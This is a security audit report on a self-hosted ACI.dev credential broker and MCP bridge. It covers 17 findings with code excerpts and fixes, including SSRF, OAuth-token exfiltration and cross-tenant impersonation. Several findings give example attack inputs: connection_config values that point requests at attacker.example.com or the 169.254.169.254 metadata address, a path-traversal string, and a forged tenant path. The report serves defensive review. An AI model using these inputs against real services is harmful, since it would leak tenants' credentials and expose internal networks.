# ACI Layer Bug-Hunt Report

> ## ✅ RESOLUTION STATUS — updated 2026-06-15
> **Both CRITICAL findings are now FIXED and verified live.**
>
> - **C-1 — `connection_config` SSRF / OAuth-token exfiltration** → fixed in two layers:
>   (a) *execute-time* guard in `rest_function_executor.py` (per-value host-label validation,
>   percent-encoded path params, `_validate_outbound_url` blocking non-https / private-IP /
>   unresolved URLs); (b) *write-time* Pydantic validator on `connection_config` across every
>   create/update/import schema (`common/schemas/linked_accounts.py`).
>   **Verified:** `evil.com/`, `x@evil.com`, `instance_url=https://169.254.169.254`,
>   `region=com.evil.com` → all `422`; valid `subdomain=acme` → `200`.
> - **C-2 — bridge cross-tenant impersonation / fail-open auth** → fixed: bridge is
>   **fail-closed** (refuses to start with no auth) and supports **per-tenant token→owner
>   binding** (URL tenant must equal the token's owner; owner sent to ACI comes from the token).
>   **Verified:** cross-tenant → `403 tenant mismatch`; bad/no token → `401`; no-auth start → exits.
>
> Also fixed: cross-app tool invocation (bridge now enforces `tool` starts with `app__`),
> path-traversal via path params (percent-encoding), Zoho `{region}` suffix-grafting (allowlist).
> Remaining MEDIUM items (error-body passthrough, broker `500`-on-refresh-failure) are open.

## 1. Executive Summary

**Scope:** custom additions layered onto a self-hosted ACI.dev fork acting as a multi-tenant credential broker + MCP tool server for a CX voice-agent platform (connection_config templating, the credential broker endpoints, the REST executor, the Bun/Hono MCP bridge, the OpenAPI→ACI converter, and 34 app definitions).

**Verified defects: 17 distinct root causes** (after merging — see below). Severity distribution:

| Severity | Count |
|---|---|
| Critical | 2 |
| High | 6 |
| Medium | 7 |
| Low | 2 |

**Worst severity: critical.** Two independent critical issues exist:

- **A. SSRF + OAuth-token exfiltration via `connection_config` templating** (server-side, ACI backend).
- **B. Cross-tenant impersonation / auth bypass in the MCP bridge** (tenant identity is taken from the URL path with a single shared bearer token; auth is also fully optional).

**Single most urgent fix:** the bridge cross-tenant authorization hole (Finding B). It is the cheapest to exploit (no provider templating needed, just change a path segment), it is reachable by anyone holding the one shared `BRIDGE_SECRET_KEY` — or *anyone at all* when the key is unset — and it yields full impersonation of any tenant using that tenant's stored OAuth credentials. Bind tenant identity to the credential (per-tenant token / JWT claim) and fail closed when no secret is configured. Do this before exposing the bridge to any network.

Note on honesty: for both the bridge and the SSRF criticals, the cleanest cross-trust-boundary harm is **SSRF into internal networks / cloud metadata** and **cross-tenant impersonation**. The pure "tenant exfiltrates its own OAuth token" angle is partly self-inflicted (the tenant already owns that token). I have not inflated those into something they aren't — the cross-boundary impact alone justifies critical.

---

## 2. Systemic Patterns

Three recurring root-cause patterns run through these findings:

**Pattern 1 — Trust boundary collapsed onto unvalidated, caller-supplied input (the dominant theme).**
`connection_config` is declared as a bare `dict | None` with no key allowlist and no value validation, and is persisted verbatim on *every* write path (`/oauth2-import`, `/api-key`, OAuth2 flow-start, PATCH). It is then templated raw into the outbound `server_url` and the request carries a live OAuth bearer to whatever host results. The same "free-form value flows straight into a security-relevant sink with no validation and no re-check" shape produces the templating SSRF, the missing URL-encoding, the unresolved-placeholder bug, the Salesforce whole-URL placeholder, and the Zoho suffix-confusion bug. **One validation gate** (constrained `connection_config` schema + post-template host allowlist / scheme pin / private-IP block in the executor) closes most of the security surface at once.

**Pattern 2 — Authorization derived from routing data, not from the credential.**
The bridge takes `tenantId` and `appName` from the URL path and forwards them with a single all-powerful key, with no binding between the presented credential and the tenant/app being acted on. This yields cross-tenant impersonation (tenant), cross-app invocation (app), and a fully-open proxy when the key is unset. The fix family is the same: derive the principal's allowed scope from the verified credential, and reject path values that exceed it.

**Pattern 3 — Wrong error/status semantics and fail-open defaults at boundaries.**
Expected, client-recoverable conditions are reported as server faults or are bypassed entirely: refresh failure → 500; missing `expires_at` → stale token returned despite the broker's "never expired" guarantee; malformed body → plain-text 500 instead of a JSON-RPC envelope; missing `BRIDGE_SECRET_KEY` → no auth at all; raw ACI error bodies leaked to callers. The platform already uses the correct fail-closed pattern for `ACI_API_KEY` (`process.exit(1)`) but does not apply it to the auth secret — the inconsistency is the bug.

**Merges performed.** The three separately-filed "SSRF / OAuth-token exfiltration via connection_config templating" findings (filed against `linked_accounts.py`, `rest_function_executor.py`, and `schemas/linked_accounts.py`) are **one defect** spanning the write path, the schema, and the execute path. I merge them into **C-1** below. The Salesforce whole-URL placeholder (H-7) and the Zoho `{region}` suffix-confusion (M-7) are *instances* of the same root cause in specific app definitions; I keep them separate because their fix lives in the app JSON, not the executor, and they remain exploitable even if the executor adds encoding.

---

## 3. Findings by Severity

### CRITICAL

---

#### C-1 — SSRF + OAuth-token exfiltration: unvalidated `connection_config` templated raw into `server_url` at execute time
**(merges 3 verified findings: write path, schema, execute path)**

- **Write path:** `aci/backend/aci/server/routes/linked_accounts.py:321` (`/api-key`), `:393` (`/oauth2-import`), `:520` (OAuth2 flow-start), and PATCH (`crud/linked_accounts.py:146-147`) — all persist `body.connection_config` verbatim.
- **Schema:** `aci/backend/aci/common/schemas/linked_accounts.py:20, 52, 67` — `connection_config: dict | None = None`, no key allowlist, no value pattern, no validator.
- **Execute path:** `aci/backend/aci/server/function_executors/rest_function_executor.py:57-91`.

```python
server_url = protocol_data.server_url
connection_config = self.linked_account.connection_config or {}
for cfg_key, cfg_value in connection_config.items():
    server_url = server_url.replace(f"{{{cfg_key}}}", str(cfg_value))   # raw, unanchored, no encoding
url = f"{server_url}{protocol_data.path}"
...
self._inject_credentials(...)            # live OAuth2 bearer / API key added AFTER url is built
request = httpx.Request(method=..., url=url, headers=headers, ...)
```

**Impact (concrete, grounded in shipped apps):** For any host-templated app — `apps/active_campaign/functions.json` (`https://{account_name}.api-us1.com`), `apps/rossum/functions.json` (`https://{organizations}.rossum.app`), zendesk/freshdesk/shopify/zoho — a tenant sets a `connection_config` value such as `{"account_name": "attacker.example.com/"}` or `{"account_name": "169.254.169.254/"}`. RFC-3986 authority parsing terminates the host at the first `/`, so the outbound request goes to the attacker host (or cloud-metadata `169.254.169.254`, or `localhost`), and `_inject_credentials` has already attached the linked account's freshly-refreshed OAuth2 bearer / API key. Result: blind SSRF from ACI's network position into internal services and metadata, plus credential exfiltration (including shared app-level default credentials, which are genuinely cross-tenant). No host allowlist, scheme check, private-IP block, or post-template re-parse exists anywhere (grep-confirmed empty across the executor and route).

**Suggested fix:**
1. Type `connection_config` as `dict[str, str]` constrained to a per-app allowlist of declared placeholder keys, each value validated against a strict pattern (a single DNS label `^[A-Za-z0-9._-]+$`, forbidding `/ : @ ? # \\` whitespace and `..`). Apply on **every** write path, the same way `_OAUTH2_CONNECTION_CONFIG_FIELDS` already whitelists token-response fields.
2. After templating, `urlsplit` the final URL and assert: scheme is `https`; host matches the app's declared suffix allowlist (e.g. ends in `.api-us1.com`); host does not resolve to a private/loopback/link-local range (block `169.254/16`, `127/8`, `10/8`, `172.16/12`, `192.168/16`, `::1`, `fc00::/7`). Reject before issuing the request.

---

#### C-2 — No per-tenant authorization: single shared bearer lets any caller act as ANY tenant via the URL path

- **File:** `aci-mcp-server/bridge/src/main.ts:153-162, 96-106`

```ts
const secretKey = process.env.BRIDGE_SECRET_KEY;
if (secretKey) { app.use("/:appName/:tenantId", bearerAuth({ token: secretKey })); }
...
const tenantId = c.req.param("tenantId");          // tenant comes from the URL
...
body: JSON.stringify({ function_input: args, linked_account_owner_id: tenantId })  // forwarded verbatim
```

**Impact:** `bearerAuth({ token })` only does a constant-time string compare against one process-wide secret — there is no `verifyToken` callback and no tenant scoping. The tenant identity is the attacker-controlled path segment, forwarded as `linked_account_owner_id`, on which ACI resolves and attaches that tenant's stored OAuth tokens server-side. Any holder of the single `BRIDGE_SECRET_KEY` (a leaked token, one tenant's worker, any internal caller) can `POST /<app>/<victim-tenant>` and execute tools as that victim — full cross-tenant impersonation and OAuth-backed data access. The file's own docstring confirms the design: "the tenant id travels in the URL per request — one process serves all tenants."

**Suggested fix:** Do not derive tenant identity from the URL. Issue per-tenant tokens (or a JWT whose claim carries the owner id) and set `linked_account_owner_id` from the *verified* credential. If the path must keep `tenantId` for routing, add a `verifyToken` callback that maps token → allowed owner id and rejects on mismatch.

---

### HIGH

---

#### H-1 — Auth fully disabled when `BRIDGE_SECRET_KEY` is unset or empty (open credential proxy)

- **File:** `aci-mcp-server/bridge/src/main.ts:153-156`

`if (secretKey)` is a truthiness check; both `undefined` and `""` are falsy, so the `bearerAuth` middleware is silently never registered and `POST /:appName/:tenantId` is fully unauthenticated. Combined with C-2, an unauthenticated attacker who reaches the port executes any tool as any tenant. The README documents the key as "optional," so deploying without it is a sanctioned config, and there is no startup warning — while `ACI_API_KEY` already uses the correct `process.exit(1)` fail-closed pattern (lines 35-38). **Fix:** fail closed — treat missing/empty `BRIDGE_SECRET_KEY` as fatal for a network-exposed multi-tenant broker, or require an explicit opt-out flag plus a loud warning. Never default to no auth.

---

#### H-2 — `appName` in the URL is not enforced on `tools/call` — any app's functions are invocable

- **File:** `aci-mcp-server/bridge/src/main.ts:134-136, 91-106`

`tools/list` is scoped via `getTools(app)` (filters by `app_names`), but the `tools/call` handler takes `request.params.name` straight from the client and POSTs it to `/v1/functions/<NAME>/execute` with no check that the function belongs to the path's app — `aciApp` is never passed to `executeTool`. A client on `/google_calendar/<tenant>` can invoke `SLACK__SEND_MESSAGE` for that tenant.

**Honest scoping (verifiers down-rated this):** this is **cross-app within a single tenant**, not cross-tenant (`tenantId` is correctly threaded). The blast radius is bounded server-side by `agent.allowed_apps` (`routes/functions.py:387` raises `AppNotAllowedForThisAgent`), so it is not the entire 34-app catalog — but for the intended single-agent-all-apps deployment it reaches every granted app. Real defect; effective severity medium-high. **Fix:** before executing, verify `name` is in `getTools(app)` (or `name.startsWith(app + "__")`); otherwise return `isError`.

---

#### H-3 — `connection_config` / path values are not URL-encoded → path traversal & host/query injection

- **File:** `aci-mcp-server`'s backend `rest_function_executor.py:59-66`

Both the `connection_config` substitution and the path-parameter substitution inject raw `str(value)` with no percent-encoding, then hand a prebuilt string to `httpx.Request`. **Empirically reproduced** by verifiers: `account_name="evil.com/"` → host `evil.com` (host hijack + credential leak); `"..%2f..%2fadmin"` → path confusion; a value with `?` was reproduced to merge into `params=query` on httpx 0.27.2 (though on the pinned 0.28.1 the in-string query is dropped — vector is version-dependent). **Two sub-claims were refuted and should not be reported as fact:** raw CRLF is rejected by httpx (`InvalidURL`), and `%0d%0a` stays encoded on the wire — no header smuggling. The core (no encoding → traversal + host/structure injection) is real and high. This is the same root cause as C-1; the executor-side fix (percent-encode per position with `urllib.parse.quote`, reject control chars, build via `httpx.URL`/structured params) covers both.

---

#### H-4 — Required `query`/`header`/`cookie` parameters are never enforced

- **File:** `aci-mcp-server/tools/openapi_to_aci.py:198`

```python
top_required = [loc for loc in ("path", "body") if loc in properties]
```

Only `path` and `body` group nodes can land in the top-level `required` array; `query`/`header`/`cookie` group nodes never do, even when they contain required params. The inner `required: ["apiVersion"]` is unreachable because its parent group can be wholly omitted. **Confirmed in shipped output:** `CONFLUENCE__SEARCHCONTENTBYCQL` emits top-level `required: []` while the query group carries `required: ["cql"]` (also `GOOGLE_DOCS__DOCUMENTS_GET`, `CONFLUENCE__DELETE_CONTENT_LABEL`). Validators pass a call that drops the whole group. **Honest scoping:** none of the 34 apps defines a *required tenant-scoping header*, so the "untenanted cross-tenant call" framing is hypothetical here — effective severity medium (correctness/protocol). **Fix:** include any location group in `top_required` when it has a non-empty `required` list.

---

#### H-5 — Name dedupe can still emit duplicate tool names

- **File:** `aci-mcp-server/tools/openapi_to_aci.py:249-254`

```python
if nm in used:
    used[nm] += 1
    fn["name"] = f"{nm}_{used[nm]}"   # suffixed name never registered in `used`, never re-checked
else:
    used[nm] = 1
```

The synthesized `X_2` is never registered, so a third operation whose natural name is literally `X_2` collides. **Reproduced:** operationIds `dup, dup, dup_2` → `CC__DUP, CC__DUP_2, CC__DUP_2` (literal duplicate); the HubSpot-style path-fallback naming (documented in the file) reproduces it without contrived ids, with the two duplicates pointing at *different* endpoints. Duplicate names break the MCP `tools/list`/`tools/call` contract (one shadows the other → wrong endpoint) and likely fail ACI's unique-name import. **Honest scoping:** build-time generator, no current app affected — effective severity medium. **Fix:** loop-increment the candidate until free and register every emitted final name.

---

#### H-6 — Salesforce `server_url` is the bare tenant-supplied `{instance_url}` with no static host/scheme pin

- **File:** `aci-mcp-server/apps/salesforce/functions.json` (all 5 functions), `apps/salesforce/app.json` (Authorization: Bearer)

All five Salesforce tools set `"server_url": "{instance_url}"` — the *entire* base URL (scheme + host + path) is a tenant-supplied `connection_config` value with no constraint. Salesforce is the **only** app of the 34 that does this; every other templated app pins a static suffix (`{site}.atlassian.net`, `{subdomain}.zendesk.com`, etc.). A tenant linking with `instance_url=http://169.254.169.254/` sends the Salesforce OAuth bearer there — SSRF + token exfil, the most severe instance of C-1 because there is no suffix to confuse around. **Fix:** template only a bounded host label — `"https://{subdomain}.my.salesforce.com"` — and store just the instance label in `connection_config`. The executor-side allowlist from C-1 backstops it.

---

### MEDIUM

---

#### M-1 — Broker `/credentials` returns HTTP 500 on a client-recoverable refresh failure

- **File:** `aci/backend/aci/server/routes/linked_accounts.py:445-448`; `exceptions.py:455-460`

An expired/revoked/missing upstream refresh token raises `OAuth2Error`, hard-coded to `error_code=HTTP_500_INTERNAL_SERVER_ERROR`, faithfully returned 500 by the global handler. For a nango-replacement broker, "re-link required" is a client-actionable 4xx condition, not a server fault — clients treat 500 as retry/our-bug and hammer the endpoint, polluting error-rate/paging. No info leak (the provider error is replaced with a generic message). **Fix:** give "refresh failed / re-auth required" its own exception type with a 401/409 code, reserving 500 for true infra faults.

---

#### M-2 — Broker hands back an expired token when imported token has no `expires_at`

- **File:** `aci/backend/aci/server/security_credentials_manager.py:213-216`

```python
def _access_token_is_expired(oauth2_credentials) -> bool:
    if oauth2_credentials.expires_at is None:
        return False               # refresh-on-read silently skipped
    return oauth2_credentials.expires_at < int(time.time())
```

`/oauth2-import` accepts `expires_at` as optional (default `None`), and nango migrations frequently omit absolute expiry. For such accounts the refresh branch is never entered, so the broker keeps returning the dead `access_token` forever despite holding a usable `refresh_token` — violating the documented "never gets an expired token" guarantee for the exact migration path the endpoint exists to serve. Downstream calls 401 with no self-heal. **Fix:** treat missing `expires_at` as "needs refresh" when a `refresh_token` is present (or require `expires_at` on import when a refresh token is supplied); add expiry leeway (the code's own TODO at line 212); force refresh-and-retry on a provider 401.

---

#### M-3 — Unresolved `{placeholder}` leaks literally into the URL when `connection_config` lacks the key

- **File:** backend `rest_function_executor.py:57-62`

If a required key is absent (config is optional/unvalidated), the literal placeholder survives into `server_url` (e.g. `https://{account_name}.api-us1.com`). **Reproduced (httpx 0.28.1):** braces are *not* percent-encoded and `httpx.Request` does not raise on construction; the request fails at connect (caught → generic failure), or — for wildcard-DNS provider domains — lands on the provider's own apex. The "attacker-registrable host" escalation is **refuted** (the leftover text is the app's static template, not attacker input). Real outcome: silent degradation to a failed/wrong-host request instead of a clear config error — correctness only. **Fix:** after substitution, `re.search(r"\{[^/]+\}", url)` and fail fast with an explicit configuration error.

---

#### M-4 — ACI internal error bodies passed through to the caller (information leakage)

- **File:** `aci-mcp-server/bridge/src/main.ts:77-79, 107-113`

`getTools` throws `Error("ACI list functions failed (...): " + await res.text())` (the MCP SDK places `error.message` verbatim into the JSON-RPC error sent to the client), and `executeTool` returns `error: "ACI execute failed (...): " + JSON.stringify(body)` surfaced as `tools/call` text. This leaks ACI/provider internals — including, per `tool_sweep.py`, internal hostnames/IPs (`getaddrinfo`, `connection refused`), raw upstream auth/error payloads, and unsubstituted `connection_config` templates carrying per-tenant `{subdomain}/{instance_url}/{auth_id}` values — to whoever called the bridge, and (since results enter the LLM context) potentially to the end voice caller. **Fix:** return a generic stable message to the caller; log the detailed ACI body server-side only.

---

#### M-5 — Malformed/empty request body throws outside the try/catch → plain-text 500 instead of JSON-RPC error

- **File:** `aci-mcp-server/bridge/src/main.ts:167`

`const requestBody = await c.req.json();` runs **before** the `try` block (starts at 172). Hono's `req.json()` does an unguarded `JSON.parse`; an empty/non-JSON body rejects, escapes the handler's catch (which produces the `-32603` JSON-RPC envelope), and hits Hono's default `errorHandler` → `c.text("Internal Server Error", 500)`. MCP clients get an unparseable response for any malformed POST. No crash, no security impact, bearerAuth still applies — effective severity low (protocol-contract inconsistency). **Fix:** parse inside the try (or wrap it) and return `{ jsonrpc: "2.0", error: { code: -32700, message: "Parse error" }, id: null }` with status 400.

---

#### M-6 — Free-plan quota bump inverts the plan hierarchy; subscribing silently downgrades & quota-blocks the tenant

- **File:** `aci/backend/aci/cli/commands/billing.py:30-71`

Free was bumped to `linked_accounts=1_000_000`, `api_calls_monthly=1e9`, etc., but `starter` (250 / 100k / projects 5) and `team` (1000 / 300k / projects 10) were left at the tiny upstream values, all three `is_public=True`. Enforcement reads `active_plan.features[...]` with no free-floor (`quota_manager.py:105`, `dependencies.py:155`), and `create-checkout-session` has no `is_public` gate. A de-facto-free tenant with thousands of linked accounts who subscribes to Starter is instantly capped to 250 / 100k and starts getting `MaxUniqueLinkedAccountOwnerIdsReached` / `MonthlyQuotaExceeded` — paying makes the service worse. **Honest scoping:** recoverable 4xx (no data loss/security), gated behind deliberate admin action + live Stripe wiring — effective severity medium. **Fix:** make `starter/team >= free` (preserve `free < starter < team`) or set `is_public=False` on paid plans for self-hosted; add a seed assertion that `free <= starter <= team` for every numeric feature.

---

#### M-7 — Zoho CRM/People `server_url` templates the trailing host segment `{region}` with no fixed suffix (suffix confusion)

- **File:** `aci-mcp-server/apps/zoho_crm/functions.json` (and `apps/zoho_people/functions.json`)

`"https://www.zohoapis.{region}"` / `"https://people.zoho.{region}"` — the tenant-supplied `{region}` is the *last* host component with no static text after it. A value like `com.attacker.example` yields host `www.zohoapis.com.attacker.example`, and the Zoho OAuth token (`Authorization: Zoho-oauthtoken`) is sent there. Unlike the `{subdomain}.zendesk.com`-style apps, the tenant controls the TLD and beyond. **Honest scoping (one verifier could not confirm in-repo):** the actual substitution/HTTP call lives in the out-of-repo ACI executor, and the most direct case is a tenant exfiltrating its own token (SSRF egress remains cross-boundary). This is the same class as C-1/H-6; effective severity medium. **Fix:** enum-constrain `region` to the closed Zoho set (`com|eu|in|com.au|jp|ca`) or restructure to a bounded subdomain with a fixed suffix; the C-1 executor allowlist backstops it.

---

#### M-8 — Spec server-URL placeholders pass through unchanged → template vars `connection_config` cannot fill

- **File:** `aci-mcp-server/tools/openapi_to_aci.py:234-236, 207`

When `--server-url` is omitted, `servers[0].url` is taken with only `.rstrip("/")` and written verbatim; OpenAPI server variables (`{tenant}`, `{basePath}`, `{version}`) are never resolved from `servers[i].variables[*].default`. Only the five known `connection_config` keys can be filled, so other placeholders leave literal braces → malformed request at execute time. **Honest scoping:** build-time CLI, output is printed and re-caught by `tool_sweep.py`'s TEMPLATE classifier, and **zero of the 34 shipped apps** contain an unfillable placeholder — latent. Effective severity low–medium. **Fix:** resolve `servers[*].variables[*].default`, or warn/fail unless every placeholder is one of the supported keys.

---

### LOW

---

#### L-1 — Required fields nested deeper than the `depth > 6` guard are silently dropped

- **File:** `aci-mcp-server/tools/openapi_to_aci.py:62, 84-89`

The recursion guard collapses any subtree below depth ~6 to a free `additionalProperties:true` object; required leaf fields below that depth vanish. Schema stays valid (required is filtered to surviving props — no contradiction, no crash), but the agent loses schema guidance and may send incomplete bodies. Build-time only; **no current app triggers it** (max real free-object depth is 5) — latent. **Fix:** raise/configure the depth limit and, at the boundary, preserve required leaf names as permissive string properties rather than dropping the subtree.

---

#### L-2 — `total_quota_used` int4 counter can overflow → `integer out of range` 500s

- **File:** `aci/backend/aci/common/db/crud/projects.py:107-119`; `sql_models.py:105`

`total_quota_used` is `Integer` (int4, max 2.1B), incremented every request and **never reset**, and read by no enforcement gate (pure liability). The `1e9/month` free bump removes the monthly ceiling, so only `PROJECT_DAILY_QUOTA` constrains lifetime volume; once the counter crosses int32 max the `UPDATE ... + 1` raises `integer out of range` and 500s that project's endpoints. **Honest scoping:** the title's "realistic timeframe" is overstated — at the configured 100k/day it is ~58 years per project; it is a pre-existing column-type issue the bump merely accelerates. Severity low is correct. **Fix:** migrate `total_quota_used` (and the other int4 quota counters) to `BigInteger`, or drop `total_quota_used` if unused; keep configured `api_calls_monthly` consistent with the column type.

---

## 4. One-Paragraph Triage Recommendation

Land the two criticals first and in this order: (1) **C-2/H-1** bridge auth — bind tenant to credential and fail closed — because it is trivially exploitable and is the only thing standing between a leaked/absent key and full cross-tenant impersonation; (2) **C-1** — add the `connection_config` schema constraint plus the post-template host allowlist/scheme/private-IP guard in the executor, which simultaneously closes H-3, M-3, H-6 and M-7. Then H-2 (app-scope check on `tools/call`) and the broker error-semantics pair (M-1, M-2). The converter findings (H-4, H-5, M-8, L-1) are build-time and can be fixed in one converter pass with a regression check that asserts: no duplicate names, every required group in `top_required`, and no unfillable placeholders in any emitted `server_url`.